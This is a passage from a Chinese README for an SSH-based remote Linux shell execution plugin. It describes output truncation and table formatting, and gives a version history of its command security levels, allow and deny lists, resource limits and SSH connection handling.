- 超过限制时返回 `truncated: true`
- 完整输出保存到临时文件，返回 `fullOutputPath`

### 表格美化

自动识别并美化以下命令的表格输出：
- `ps`、`docker ps`、`df`、`free`、`netstat`、`ss`

## 版本历史

- **v1.2.0** - 配置回退与接口简化
  - 实现 Host 配置回退机制，支持插件本地 `hosts.json`。
  - 简化 `listHosts` 输出，移除连通性过滤逻辑。
  - 升级 `getHostConfig` 为异步方法以支持文件系统回退。
- **v1.1.9** - 连接策略优化与资源回收
  - 重构 SSH 连接逻辑，默认不使用连接池以适配 VCP 多进程架构。
  - 实现命令执行完毕后自动断开非池化连接，防止进程挂起。
- **v1.1.8** - SSHManager 共享模块重构 (v1.2.4)
  - 将 LinuxShellExecutor 私有 SSHManager 逻辑合并至共享模块。
  - 实现 `basePath` 动态私钥路径解析，支持插件级私钥文件。
  - 插件入口对齐 `getSSHManager(config, options)` 接口。
- **v1.1.7** - 审计修复与稳定性增强
  - 修复 `isLongRunning` 异步闭环逻辑，确保长时任务托管至 `MonitorManager`。
  - 修正 `main()` 异步包装，解决 `Discovery` 资产发现状态透传失效问题。
  - 调整安全校验顺序，支持授权码逃逸白名单及安全等级限制。
  - 增强 `SecurityLevelValidator`，实现特殊操作符（`;`, `&&`, `|`）校验。
  - 在内置及共享 `SSHManager` 模块中引入输出长度限制，彻底根治 OOM 风险。
- **v1.1.6** - SSH 认证安全加固 (PAM Defense)
  - 显式禁用 `keyboard-interactive` 探测，规避 PAM 认证失败计数。
  - 引入 `hostQueues` 主机级锁，强制认证过程串行化。
- **v1.1.5** - 全平台静默安装与资源锁柔性修复
- **v1.1.0** - 授权码逃逸、资产引导、长待机指令支持
- **v0.4.0** - 四级安全分级、预设命令、输出格式化
  - 新增四级安全分级（read/safe/write/danger）
  - 新增智能管道链验证
  - 新增 12 个预设诊断命令
  - 新增输出格式化（自动截断、表格美化）
  - 新增 securityLevels.json 和 presets.json 配置文件
- **v0.3.1** - 新增三级权限控制（白名单/灰名单/黑名单）
  - 白名单命令无需验证即可执行
  - 灰名单命令需要管理员验证码
  - 新增 graylist.json 配置文件，包含运维命令
  - 支持 systemctl、docker、kill、journalctl 等运维命令
- **v0.3.0** - 新增资源限制(rlimit)、管道命令验证、SSH连接池优化
  - 实现 RlimitManager 类，支持 CPU/内存/文件/进程数限制
  - 实现管道命令解析和验证，支持 allowedPipeCommands 和 forbiddenInPipe
  - SSH 连接池增加连接数量限制、自动重试、等待队列
- **v0.2.0** - 新增多主机 SSH 远程执行、密钥认证、跳板机支持
- **v0.1.0** - 初始版本，实现六层安全架构

## 许可证

MIT License
